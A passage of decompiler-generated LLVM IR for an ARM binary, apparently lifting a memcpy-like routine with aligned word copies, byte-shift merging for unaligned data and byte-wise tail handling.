  %v6_14a64 = add i32 %v0_14a64, 8
  %v7_14a64 = inttoptr i32 %v6_14a64 to i32*
  %v8_14a64 = load i32, i32* %v7_14a64, align 4
  store i32 %v8_14a64, i32* @ip, align 4
  %v9_14a64 = add i32 %v0_14a64, 12
  %v10_14a64 = inttoptr i32 %v9_14a64 to i32*
  %v11_14a64 = load i32, i32* %v10_14a64, align 4
  store i32 %v11_14a64, i32* @lr, align 4
  %v12_14a64 = add i32 %v0_14a64, 16
  store i32 %v12_14a64, i32* @r1, align 4
  %v1_14a68 = inttoptr i32 %v12_14a60 to i32*
  store i32 %v2_14a64, i32* %v1_14a68, align 4
  %v3_14a68 = add i32 %v0_14a60, 20
  %v4_14a68 = inttoptr i32 %v3_14a68 to i32*
  %v5_14a68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14a68, i32* %v4_14a68, align 4
  %v6_14a68 = add i32 %v0_14a60, 24
  %v7_14a68 = inttoptr i32 %v6_14a68 to i32*
  %v8_14a68 = load i32, i32* @ip, align 4
  store i32 %v8_14a68, i32* %v7_14a68, align 4
  %v9_14a68 = add i32 %v0_14a60, 28
  %v10_14a68 = inttoptr i32 %v9_14a68 to i32*
  %v11_14a68 = load i32, i32* @lr, align 4
  store i32 %v11_14a68, i32* %v10_14a68, align 4
  %v12_14a68 = add i32 %v0_14a60, 32
  store i32 %v12_14a68, i32* %r0.global-to-local, align 4
  %v0_14a6c = load i32, i32* %r2.global-to-local, align 4
  %v2_14a6c = add i32 %v0_14a6c, -32
  store i32 %v2_14a6c, i32* %r2.global-to-local, align 4
  %v6_14a70 = icmp slt i32 %v0_14a6c, 32
  br i1 %v6_14a70, label %dec_label_pc_14a74, label %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge

dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge:  ; preds = %dec_label_pc_14a5c
  %v0_14a5c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a5c
  %v4_14a74 = add i32 %v0_14a6c, -16
  %v6_14a74 = add i32 %v0_14a6c, 2147483616
  %v7_14a74 = and i32 %v4_14a74, %v6_14a74
  %v8_14a74 = icmp slt i32 %v7_14a74, 0
  store i1 %v8_14a74, i1* %cpsr_v.global-to-local, align 1
  %v9_14a74 = icmp slt i32 %v4_14a74, 0
  store i1 %v9_14a74, i1* %cpsr_n.global-to-local, align 1
  %v5_14a78 = icmp slt i32 %v2_14a6c, -16
  br i1 %v5_14a78, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_14a74
  %v6_14a78 = load i32, i32* @r1, align 4
  %v7_14a78 = inttoptr i32 %v6_14a78 to i32*
  %v8_14a78 = load i32, i32* %v7_14a78, align 4
  store i32 %v8_14a78, i32* %r3.global-to-local, align 4
  %v9_14a78 = add i32 %v6_14a78, 4
  %v10_14a78 = inttoptr i32 %v9_14a78 to i32*
  %v11_14a78 = load i32, i32* %v10_14a78, align 4
  store i32 %v11_14a78, i32* %r4.global-to-local, align 4
  %v12_14a78 = add i32 %v6_14a78, 8
  %v13_14a78 = inttoptr i32 %v12_14a78 to i32*
  %v14_14a78 = load i32, i32* %v13_14a78, align 4
  store i32 %v14_14a78, i32* @ip, align 4
  %v15_14a78 = add i32 %v6_14a78, 12
  %v16_14a78 = inttoptr i32 %v15_14a78 to i32*
  %v17_14a78 = load i32, i32* %v16_14a78, align 4
  store i32 %v17_14a78, i32* @lr, align 4
  %v18_14a78 = add i32 %v6_14a78, 16
  store i32 %v18_14a78, i32* @r1, align 4
  %v7_14a7c = inttoptr i32 %v12_14a68 to i32*
  store i32 %v8_14a78, i32* %v7_14a7c, align 4
  %v9_14a7c = add i32 %v0_14a60, 36
  %v10_14a7c = inttoptr i32 %v9_14a7c to i32*
  %v11_14a7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_14a7c, i32* %v10_14a7c, align 4
  %v12_14a7c = add i32 %v0_14a60, 40
  %v13_14a7c = inttoptr i32 %v12_14a7c to i32*
  %v14_14a7c = load i32, i32* @ip, align 4
  store i32 %v14_14a7c, i32* %v13_14a7c, align 4
  %v15_14a7c = add i32 %v0_14a60, 44
  %v16_14a7c = inttoptr i32 %v15_14a7c to i32*
  %v17_14a7c = load i32, i32* @lr, align 4
  store i32 %v17_14a7c, i32* %v16_14a7c, align 4
  %v18_14a7c = add i32 %v0_14a60, 48
  store i32 %v18_14a7c, i32* %r0.global-to-local, align 4
  %v6_14a80 = load i32, i32* %r2.global-to-local, align 4
  %v7_14a80 = add i32 %v6_14a80, -16
  store i32 %v7_14a80, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14a74, %bb130
  %v3_14a90102 = phi i32 [ %v12_14a68, %dec_label_pc_14a74 ], [ %v18_14a7c, %bb130 ]
  %v0_14a8896 = phi i32 [ %v2_14a6c, %dec_label_pc_14a74 ], [ %v7_14a80, %bb130 ]
  %v2_14a84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14a84, i32* @r4, align 4
  br label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a50, %.thread2
  %v3_14a90101 = phi i32 [ %v0_14a6093, %dec_label_pc_14a50 ], [ %v3_14a90102, %.thread2 ]
  %v0_14a88 = phi i32 [ %v2_14a50, %dec_label_pc_14a50 ], [ %v0_14a8896, %.thread2 ]
  %v1_14a88 = add i32 %v0_14a88, 20
  store i32 %v1_14a88, i32* %r2.global-to-local, align 4
  %v3_14a88 = sub i32 0, %v0_14a88
  %v4_14a88 = and i32 %v1_14a88, %v3_14a88
  %v5_14a88 = icmp slt i32 %v4_14a88, 0
  store i1 %v5_14a88, i1* %cpsr_v.global-to-local, align 1
  %v6_14a88 = icmp slt i32 %v1_14a88, 0
  store i1 %v6_14a88, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %.thread118, %dec_label_pc_14a88
  %v0_14a9c.pre149 = phi i32 [ %v0_14a9c.pre, %.thread118 ], [ %v1_14a88, %dec_label_pc_14a88 ]
  %v3_14a90 = phi i32 [ %v3_14a9099119, %.thread118 ], [ %v3_14a90101, %dec_label_pc_14a88 ]
  %v1_14a94 = phi i1 [ %v1_14a98, %.thread118 ], [ %v5_14a88, %dec_label_pc_14a88 ]
  %v0_14a94 = phi i1 [ %v0_14a98, %.thread118 ], [ %v6_14a88, %dec_label_pc_14a88 ]
  %v2_14a8c = xor i1 %v1_14a94, %v0_14a94
  br i1 %v2_14a8c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_14a8c
  %v3_14a8c = load i32, i32* @r1, align 4
  %v4_14a8c = inttoptr i32 %v3_14a8c to i32*
  %v5_14a8c = load i32, i32* %v4_14a8c, align 4
  store i32 %v5_14a8c, i32* %r3.global-to-local, align 4
  %v6_14a8c = add i32 %v3_14a8c, 4
  %v7_14a8c = inttoptr i32 %v6_14a8c to i32*
  %v8_14a8c = load i32, i32* %v7_14a8c, align 4
  store i32 %v8_14a8c, i32* @ip, align 4
  %v9_14a8c = add i32 %v3_14a8c, 8
  %v10_14a8c = inttoptr i32 %v9_14a8c to i32*
  %v11_14a8c = load i32, i32* %v10_14a8c, align 4
  store i32 %v11_14a8c, i32* @lr, align 4
  %v12_14a8c = add i32 %v3_14a8c, 12
  store i32 %v12_14a8c, i32* @r1, align 4
  %v4_14a90 = inttoptr i32 %v3_14a90 to i32*
  store i32 %v5_14a8c, i32* %v4_14a90, align 4
  %v6_14a90 = add i32 %v3_14a90, 4
  %v7_14a90 = inttoptr i32 %v6_14a90 to i32*
  %v8_14a90 = load i32, i32* @ip, align 4
  store i32 %v8_14a90, i32* %v7_14a90, align 4
  %v9_14a90 = add i32 %v3_14a90, 8
  %v10_14a90 = inttoptr i32 %v9_14a90 to i32*
  %v11_14a90 = load i32, i32* @lr, align 4
  store i32 %v11_14a90, i32* %v10_14a90, align 4
  %v12_14a90 = add i32 %v3_14a90, 12
  store i32 %v12_14a90, i32* %r0.global-to-local, align 4
  %v3_14a94 = load i32, i32* %r2.global-to-local, align 4
  %v4_14a94 = add i32 %v3_14a94, -12
  store i32 %v4_14a94, i32* %r2.global-to-local, align 4
  %v6_14a94 = sub i32 11, %v3_14a94
  %v7_14a94 = and i32 %v6_14a94, %v3_14a94
  %v8_14a94 = icmp slt i32 %v7_14a94, 0
  store i1 %v8_14a94, i1* %cpsr_v.global-to-local, align 1
  %v9_14a94 = icmp slt i32 %v4_14a94, 0
  store i1 %v9_14a94, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_14a8c, %bb131
  %v0_14a9c.pre = phi i32 [ %v4_14a94, %bb131 ], [ %v0_14a9c.pre149, %dec_label_pc_14a8c ]
  %v3_14a9099119 = phi i32 [ %v12_14a90, %bb131 ], [ %v3_14a90, %dec_label_pc_14a8c ]
  %v1_14a98 = phi i1 [ %v8_14a94, %bb131 ], [ %v1_14a94, %dec_label_pc_14a8c ]
  %v0_14a98 = phi i1 [ %v9_14a94, %bb131 ], [ %v0_14a94, %dec_label_pc_14a8c ]
  %v2_14a98 = xor i1 %v1_14a98, %v0_14a98
  br i1 %v2_14a98, label %dec_label_pc_14a9c, label %dec_label_pc_14a8c

dec_label_pc_14a9c:                               ; preds = %.thread118, %dec_label_pc_14a48
  %v7_14aac = phi i32 [ %v0_14a6093, %dec_label_pc_14a48 ], [ %v3_14a9099119, %.thread118 ]
  %v0_14a9c = phi i32 [ %v2_14a48, %dec_label_pc_14a48 ], [ %v0_14a9c.pre, %.thread118 ]
  %v2_14a9c = add i32 %v0_14a9c, 8
  store i32 %v2_14a9c, i32* %r2.global-to-local, align 4
  %v4_14a9c = sub i32 0, %v0_14a9c
  %v5_14a9c = and i32 %v2_14a9c, %v4_14a9c
  %v6_14a9c = icmp slt i32 %v5_14a9c, 0
  store i1 %v6_14a9c, i1* %cpsr_v.global-to-local, align 1
  %v7_14a9c = icmp slt i32 %v2_14a9c, 0
  store i1 %v7_14a9c, i1* %cpsr_n.global-to-local, align 1
  %v5_14aa0 = icmp slt i32 %v0_14a9c, -8
  br i1 %v5_14aa0, label %bb133, label %dec_label_pc_14aa4

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a9c
  %v6_14aa4 = add i32 %v0_14a9c, 4
  store i32 %v6_14aa4, i32* %r2.global-to-local, align 4
  %v8_14aa4 = sub i32 -5, %v0_14a9c
  %v9_14aa4 = and i32 %v8_14aa4, %v2_14a9c
  %v10_14aa4 = icmp slt i32 %v9_14aa4, 0
  store i1 %v10_14aa4, i1* %cpsr_v.global-to-local, align 1
  %v11_14aa4 = icmp slt i32 %v6_14aa4, 0
  store i1 %v11_14aa4, i1* %cpsr_n.global-to-local, align 1
  %v5_14aa8 = icmp slt i32 %v2_14a9c, 4
  %v6_14aa8 = load i32, i32* @r1, align 4
  %v7_14aa8 = inttoptr i32 %v6_14aa8 to i32*
  %v8_14aa8 = load i32, i32* %v7_14aa8, align 4
  store i32 %v8_14aa8, i32* %r3.global-to-local, align 4
  %v10_14aa8 = add i32 %v6_14aa8, 4
  br i1 %v5_14aa8, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_14aa4
  store i32 %v10_14aa8, i32* @r1, align 4
  %v8_14aac = inttoptr i32 %v7_14aac to i32*
  store i32 %v8_14aa8, i32* %v8_14aac, align 4
  %v9_14aac = load i32, i32* %r0.global-to-local, align 4
  %v10_14aac = add i32 %v9_14aac, 4
  store i32 %v10_14aac, i32* %r0.global-to-local, align 4
  %v0_14abc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_14aa4
  %v10_14ab0 = inttoptr i32 %v10_14aa8 to i32*
  %v11_14ab0 = load i32, i32* %v10_14ab0, align 4
  store i32 %v11_14ab0, i32* @ip, align 4
  %v12_14ab0 = add i32 %v6_14aa8, 8
  store i32 %v12_14ab0, i32* @r1, align 4
  %v7_14ab4 = inttoptr i32 %v7_14aac to i32*
  store i32 %v8_14aa8, i32* %v7_14ab4, align 4
  %v9_14ab4 = add i32 %v7_14aac, 4
  %v10_14ab4 = inttoptr i32 %v9_14ab4 to i32*
  %v11_14ab4 = load i32, i32* @ip, align 4
  store i32 %v11_14ab4, i32* %v10_14ab4, align 4
  %v12_14ab4 = add i32 %v7_14aac, 8
  store i32 %v12_14ab4, i32* %r0.global-to-local, align 4
  %v6_14ab8 = load i32, i32* %r2.global-to-local, align 4
  %v7_14ab8 = add i32 %v6_14ab8, -4
  store i32 %v7_14ab8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_14a9c, %bb, %dec_label_pc_14c64, %dec_label_pc_14b8c, %dec_label_pc_14bf8, %bb132
  %v2_14acc = phi i32 [ %v10_14aac, %.thread6 ], [ %v0_14b5c76, %.thread12 ], [ %v7_14aac, %dec_label_pc_14a9c ], [ %v1_14a20, %bb ], [ %v2_14acc114, %dec_label_pc_14c64 ], [ %v2_14acc113, %dec_label_pc_14b8c ], [ %v2_14acc112, %dec_label_pc_14bf8 ], [ %v12_14ab4, %bb132 ]
  %v0_14abc = phi i32 [ %v0_14abc.pre, %.thread6 ], [ %v2_14b04, %.thread12 ], [ %v2_14a9c, %dec_label_pc_14a9c ], [ %v2_14a30, %bb ], [ %v0_14abc110, %dec_label_pc_14c64 ], [ %v0_14abc109, %dec_label_pc_14b8c ], [ %v0_14abc108, %dec_label_pc_14bf8 ], [ %v7_14ab8, %bb132 ]
  %v1_14abc = add i32 %v0_14abc, 4
  store i32 %v1_14abc, i32* @r2, align 4
  %v3_14abc = sub i32 0, %v0_14abc
  %v4_14abc = and i32 %v1_14abc, %v3_14abc
  %v5_14abc = icmp slt i32 %v4_14abc, 0
  store i1 %v5_14abc, i1* %cpsr_v.global-to-local, align 1
  %v6_14abc = icmp slt i32 %v1_14abc, 0
  store i1 %v6_14abc, i1* %cpsr_n.global-to-local, align 1
  %v7_14abc = icmp eq i32 %v1_14abc, 0
  store i1 %v7_14abc, i1* @cpsr_z, align 1
  br i1 %v7_14abc, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_14ac0 = load i8*, i8** %stack_var_-8, align 4
  %v4_14ac0 = ptrtoint i8* %v3_14ac0 to i32
  store i32 %v4_14ac0, i32* %r0.global-to-local, align 4
  ret i32 %v4_14ac0

bb135:                                            ; preds = %bb133
  %v1_14ac4 = add i32 %v0_14abc, 2
  %v3_14ac4 = sub i32 -3, %v0_14abc
  %v4_14ac4 = and i32 %v3_14ac4, %v1_14abc
  %v5_14ac4 = icmp slt i32 %v4_14ac4, 0
  store i1 %v5_14ac4, i1* %cpsr_v.global-to-local, align 1
  %v6_14ac4 = icmp slt i32 %v1_14ac4, 0
  store i1 %v6_14ac4, i1* %cpsr_n.global-to-local, align 1
  %v7_14ac4 = icmp eq i32 %v1_14abc, 2
  store i1 %v7_14ac4, i1* @cpsr_z, align 1
  %v0_14ac8 = load i32, i32* @r1, align 4
  %v1_14ac8 = inttoptr i32 %v0_14ac8 to i8*
  %v2_14ac8 = load i8, i8* %v1_14ac8, align 1
  %v3_14ac8 = zext i8 %v2_14ac8 to i32
  store i32 %v3_14ac8, i32* %r3.global-to-local, align 4
  %v5_14ac8 = add i32 %v0_14ac8, 1
  store i32 %v5_14ac8, i32* @r1, align 4
  %v3_14acc = inttoptr i32 %v2_14acc to i8*
  store i8 %v2_14ac8, i8* %v3_14acc, align 1
  %v4_14acc = load i32, i32* %r0.global-to-local, align 4
  %v5_14acc = add i32 %v4_14acc, 1
  store i32 %v5_14acc, i32* %r0.global-to-local, align 4
  %v0_14ad0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14ad0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14ad0 = xor i1 %v0_14ad0, %v1_14ad0
  br i1 %v2_14ad0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_14ad0 = load i32, i32* @r1, align 4
  %v4_14ad0 = inttoptr i32 %v3_14ad0 to i8*
  %v5_14ad0 = load i8, i8* %v4_14ad0, align 1
  %v6_14ad0 = zext i8 %v5_14ad0 to i32
  store i32 %v6_14ad0, i32* %r3.global-to-local, align 4
  %v8_14ad0 = add i32 %v3_14ad0, 1
  store i32 %v8_14ad0, i32* @r1, align 4
  %v6_14ad4 = inttoptr i32 %v5_14acc to i8*
  store i8 %v5_14ad0, i8* %v6_14ad4, align 1
  %v7_14ad4 = load i32, i32* %r0.global-to-local, align 4
  %v8_14ad4 = add i32 %v7_14ad4, 1
  store i32 %v8_14ad4, i32* %r0.global-to-local, align 4
  %v1_14ad8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14ad8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_14adc = phi i32 [ %v8_14ad4, %bb136 ], [ %v5_14acc, %bb135 ]
  %v2_14adc = phi i1 [ %v2_14ad8.pre, %bb136 ], [ %v1_14ad0, %bb135 ]
  %v1_14adc = phi i1 [ %v1_14ad8.pre, %bb136 ], [ %v0_14ad0, %bb135 ]
  %v0_14ad8 = load i1, i1* @cpsr_z, align 1
  %v3_14ad8 = xor i1 %v2_14adc, %v1_14adc
  %v4_14ad8 = or i1 %v0_14ad8, %v3_14ad8
  br i1 %v4_14ad8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_14ad8 = load i32, i32* @r1, align 4
  %v6_14ad8 = inttoptr i32 %v5_14ad8 to i8*
  %v7_14ad8 = load i8, i8* %v6_14ad8, align 1
  %v8_14ad8 = zext i8 %v7_14ad8 to i32
  store i32 %v8_14ad8, i32* %r3.global-to-local, align 4
  %v10_14ad8 = add i32 %v5_14ad8, 1
  store i32 %v10_14ad8, i32* @r1, align 4
  %v8_14adc = inttoptr i32 %v7_14adc to i8*
  store i8 %v7_14ad8, i8* %v8_14adc, align 1
  %v9_14adc = load i32, i32* %r0.global-to-local, align 4
  %v10_14adc = add i32 %v9_14adc, 1
  store i32 %v10_14adc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_14ae0 = load i8*, i8** %stack_var_-8, align 4
  %v3_14ae0 = ptrtoint i8* %v2_14ae0 to i32
  store i32 %v3_14ae0, i32* %r0.global-to-local, align 4
  ret i32 %v3_14ae0

dec_label_pc_14ae4:                               ; preds = %dec_label_pc_14a38
  %v1_14ae4 = sub nsw i32 4, %v1_14a38
  store i32 %v1_14ae4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14ae8 = icmp ult i32 %v1_14ae4, 2
  store i1 %v8_14ae8, i1* %cpsr_n.global-to-local, align 1
  %v1_14aec = inttoptr i32 %v0_14a20 to i8*
  %v2_14aec = load i8, i8* %v1_14aec, align 1
  %v3_14aec = zext i8 %v2_14aec to i32
  store i32 %v3_14aec, i32* %r3.global-to-local, align 4
  %v5_14aec = add i32 %v0_14a20, 1
  store i32 %v5_14aec, i32* @r1, align 4
  store i8 %v2_14aec, i8* %v5_14a2c, align 1
  %v4_14af0 = load i32, i32* %r0.global-to-local, align 4
  %v5_14af0 = add i32 %v4_14af0, 1
  store i32 %v5_14af0, i32* %r0.global-to-local, align 4
  br i1 %v8_14ae8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_14ae4
  %v9_14ae8 = icmp eq i32 %v1_14ae4, 2
  %v6_14af4 = load i32, i32* @r1, align 4
  %v7_14af4 = inttoptr i32 %v6_14af4 to i8*
  %v8_14af4 = load i8, i8* %v7_14af4, align 1
  %v9_14af4 = zext i8 %v8_14af4 to i32
  store i32 %v9_14af4, i32* %r3.global-to-local, align 4
  %v11_14af4 = add i32 %v6_14af4, 1
  store i32 %v11_14af4, i32* @r1, align 4
  %v9_14af8 = inttoptr i32 %v5_14af0 to i8*
  store i8 %v8_14af4, i8* %v9_14af8, align 1
  %v10_14af8 = load i32, i32* %r0.global-to-local, align 4
  %v11_14af8 = add i32 %v10_14af8, 1
  store i32 %v11_14af8, i32* %r0.global-to-local, align 4
  br i1 %v9_14ae8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_14afc = load i32, i32* @r1, align 4
  %v9_14afc = inttoptr i32 %v8_14afc to i8*
  %v10_14afc = load i8, i8* %v9_14afc, align 1
  %v11_14afc = zext i8 %v10_14afc to i32
  store i32 %v11_14afc, i32* %r3.global-to-local, align 4
  %v13_14afc = add i32 %v8_14afc, 1
  store i32 %v13_14afc, i32* @r1, align 4
  %v11_14b00 = inttoptr i32 %v11_14af8 to i8*
  store i8 %v10_14afc, i8* %v11_14b00, align 1
  %v12_14b00 = load i32, i32* %r0.global-to-local, align 4
  %v13_14b00 = add i32 %v12_14b00, 1
  store i32 %v13_14b00, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_14ae4, %bb139
  %v0_14b5c76 = phi i32 [ %v11_14af8, %bb138 ], [ %v5_14af0, %dec_label_pc_14ae4 ], [ %v13_14b00, %bb139 ]
  %v0_14b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b04 = load i32, i32* @ip, align 4
  %v2_14b04 = sub i32 %v0_14b04, %v1_14b04
  store i32 %v2_14b04, i32* %r2.global-to-local, align 4
  %v4_14b04 = xor i32 %v1_14b04, %v0_14b04
  %v5_14b04 = xor i32 %v2_14b04, %v0_14b04
  %v6_14b04 = and i32 %v5_14b04, %v4_14b04
  %v7_14b04 = icmp slt i32 %v6_14b04, 0
  store i1 %v7_14b04, i1* %cpsr_v.global-to-local, align 1
  %v8_14b04 = icmp slt i32 %v2_14b04, 0
  store i1 %v8_14b04, i1* %cpsr_n.global-to-local, align 1
  %v5_14b08 = icmp slt i32 %v0_14b04, %v1_14b04
  br i1 %v5_14b08, label %bb133, label %dec_label_pc_14b0c

dec_label_pc_14b0c:                               ; preds = %.thread12
  %v0_14b0c = load i32, i32* @r1, align 4
  %v1_14b0c = urem i32 %v0_14b0c, 4
  store i32 %v1_14b0c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14b0c = icmp eq i32 %v1_14b0c, 0
  %extract.t124 = trunc i32 %v0_14b0c to i2
  br i1 %v2_14b0c, label %dec_label_pc_14a48, label %dec_label_pc_14b14

dec_label_pc_14b14:                               ; preds = %dec_label_pc_14a40, %dec_label_pc_14b0c
  %v0_14b5c75 = phi i32 [ %v1_14a20, %dec_label_pc_14a40 ], [ %v0_14b5c76, %dec_label_pc_14b0c ]
  %v0_14c08 = phi i32 [ %v2_14a30, %dec_label_pc_14a40 ], [ %v2_14b04, %dec_label_pc_14b0c ]
  %v0_14b1c.off0 = phi i2 [ %extract.t, %dec_label_pc_14a40 ], [ %extract.t124, %dec_label_pc_14b0c ]
  %v0_14b14 = phi i32 [ %v0_14a20, %dec_label_pc_14a40 ], [ %v0_14b0c, %dec_label_pc_14b0c ]
  %v1_14b14 = and i32 %v0_14b14, -4
  store i32 %v1_14b14, i32* %r1.global-to-local, align 4
  %v1_14b18 = inttoptr i32 %v1_14b14 to i32*
  %v2_14b18 = load i32, i32* %v1_14b18, align 4
  store i32 %v2_14b18, i32* @lr, align 4
  %v4_14b18 = add i32 %v1_14b14, 4
  store i32 %v4_14b18, i32* %r1.global-to-local, align 4
  %v2_14c00 = add i32 %v0_14c08, -12
  %v4_14c00 = sub i32 11, %v0_14c08
  %v5_14c00 = and i32 %v4_14c00, %v0_14c08
  %v6_14c00 = icmp slt i32 %v5_14c00, 0
  store i1 %v6_14c00, i1* %cpsr_v.global-to-local, align 1
  %v7_14c00 = icmp slt i32 %v2_14c00, 0
  store i1 %v7_14c00, i1* %cpsr_n.global-to-local, align 1
  %v5_14c04 = icmp slt i32 %v0_14c08, 12
  switch i2 %v0_14b1c.off0, label %dec_label_pc_14b28 [
    i2 -1, label %dec_label_pc_14c00
    i2 -2, label %dec_label_pc_14b94
  ]

dec_label_pc_14b28:                               ; preds = %dec_label_pc_14b14
  br i1 %v5_14c04, label %dec_label_pc_14b74, label %dec_label_pc_14b30

dec_label_pc_14b30:                               ; preds = %dec_label_pc_14b28
  store i32 %v2_14c00, i32* %r2.global-to-local, align 4
  %v3_14b34 = load i32, i32* @r4, align 4
  store i32 %v3_14b34, i32* %stack_var_-16, align 4
  %v6_14b34 = load i32, i32* @r5, align 4
  store i32 %v6_14b34, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14b38

dec_label_pc_14b38:                               ; preds = %dec_label_pc_14b38.dec_label_pc_14b38_crit_edge, %dec_label_pc_14b30
  %v0_14b5c = phi i32 [ %v12_14b5c, %dec_label_pc_14b38.dec_label_pc_14b38_crit_edge ], [ %v0_14b5c75, %dec_label_pc_14b30 ]
  %v0_14b3c = phi i32 [ %v0_14b3c.pre, %dec_label_pc_14b38.dec_label_pc_14b38_crit_edge ], [ %v4_14b18, %dec_label_pc_14b30 ]
  %v0_14b38 = phi i32 [ %v0_14b38.pre, %dec_label_pc_14b38.dec_label_pc_14b38_crit_edge ], [ %v2_14b18, %dec_label_pc_14b30 ]
  %v3_14b38 = udiv i32 %v0_14b38, 256
  store i32 %v3_14b38, i32* %r3.global-to-local, align 4
  %v1_14b3c = inttoptr i32 %v0_14b3c to i32*
  %v2_14b3c = load i32, i32* %v1_14b3c, align 4
  store i32 %v2_14b3c, i32* %r4.global-to-local, align 4
  %v3_14b3c = add i32 %v0_14b3c, 4
  %v4_14b3c = inttoptr i32 %v3_14b3c to i32*
  %v5_14b3c = load i32, i32* %v4_14b3c, align 4
  store i32 %v5_14b3c, i32* %r5.global-to-local, align 4
  %v6_14b3c = add i32 %v0_14b3c, 8
  %v7_14b3c = inttoptr i32 %v6_14b3c to i32*
  %v8_14b3c = load i32, i32* %v7_14b3c, align 4
  store i32 %v8_14b3c, i32* %ip.global-to-local, align 4
  %v9_14b3c = add i32 %v0_14b3c, 12
  %v10_14b3c = inttoptr i32 %v9_14b3c to i32*
  %v11_14b3c = load i32, i32* %v10_14b3c, align 4
  store i32 %v11_14b3c, i32* @lr, align 4
  %v12_14b3c = add i32 %v0_14b3c, 16
  store i32 %v12_14b3c, i32* %r1.global-to-local, align 4
  %v4_14b40 = mul i32 %v2_14b3c, 16777216
  %v5_14b40 = or i32 %v4_14b40, %v3_14b38
  store i32 %v5_14b40, i32* %r3.global-to-local, align 4
  %v3_14b44 = udiv i32 %v2_14b3c, 256
  %v4_14b48 = mul i32 %v5_14b3c, 16777216
  %v5_14b48 = or i32 %v4_14b48, %v3_14b44
  store i32 %v5_14b48, i32* %r4.global-to-local, align 4
  %v3_14b4c = udiv i32 %v5_14b3c, 256
  %v4_14b50 = mul i32 %v8_14b3c, 16777216
  %v5_14b50 = or i32 %v4_14b50, %v3_14b4c
  store i32 %v5_14b50, i32* %r5.global-to-local, align 4
  %v3_14b54 = udiv i32 %v8_14b3c, 256
  %v4_14b58 = mul i32 %v11_14b3c, 16777216
  %v5_14b58 = or i32 %v4_14b58, %v3_14b54
  store i32 %v5_14b58, i32* @ip, align 4
  %v1_14b5c = inttoptr i32 %v0_14b5c to i32*
  store i32 %v5_14b40, i32* %v1_14b5c, align 4
  %v3_14b5c = add i32 %v0_14b5c, 4
  %v4_14b5c = inttoptr i32 %v3_14b5c to i32*
  %v5_14b5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14b5c, i32* %v4_14b5c, align 4
  %v6_14b5c = add i32 %v0_14b5c, 8
  %v7_14b5c = inttoptr i32 %v6_14b5c to i32*
  %v8_14b5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14b5c, i32* %v7_14b5c, align 4
  %v9_14b5c = add i32 %v0_14b5c, 12
  %v10_14b5c = inttoptr i32 %v9_14b5c to i32*
  %v11_14b5c = load i32, i32* @ip, align 4
  store i32 %v11_14b5c, i32* %v10_14b5c, align 4
  %v12_14b5c = add i32 %v0_14b5c, 16
  store i32 %v12_14b5c, i32* %r0.global-to-local, align 4
  %v0_14b60 = load i32, i32* %r2.global-to-local, align 4
  %v2_14b60 = add i32 %v0_14b60, -16
  store i32 %v2_14b60, i32* %r2.global-to-local, align 4
  %v6_14b64 = icmp slt i32 %v0_14b60, 16
  br i1 %v6_14b64, label %dec_label_pc_14b68, label %dec_label_pc_14b38.dec_label_pc_14b38_crit_edge

dec_label_pc_14b38.dec_label_pc_14b38_crit_edge:  ; preds = %dec_label_pc_14b38
  %v0_14b38.pre = load i32, i32* @lr, align 4
  %v0_14b3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b38

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b38
  %v2_14b68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14b68, i32* @r4, align 4
  %v5_14b68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14b68, i32* @r5, align 4
  %v2_14b6c = add i32 %v0_14b60, -4
  store i32 %v2_14b6c, i32* %r2.global-to-local, align 4
  %v4_14b6c = add i32 %v0_14b60, 2147483632
  %v5_14b6c = and i32 %v2_14b6c, %v4_14b6c
  %v6_14b6c = icmp slt i32 %v5_14b6c, 0
  store i1 %v6_14b6c, i1* %cpsr_v.global-to-local, align 1
  %v7_14b6c = icmp slt i32 %v2_14b6c, 0
  store i1 %v7_14b6c, i1* %cpsr_n.global-to-local, align 1
  %v5_14b70 = icmp slt i32 %v2_14b60, -12
  br i1 %v5_14b70, label %dec_label_pc_14b8c, label %dec_label_pc_14b74

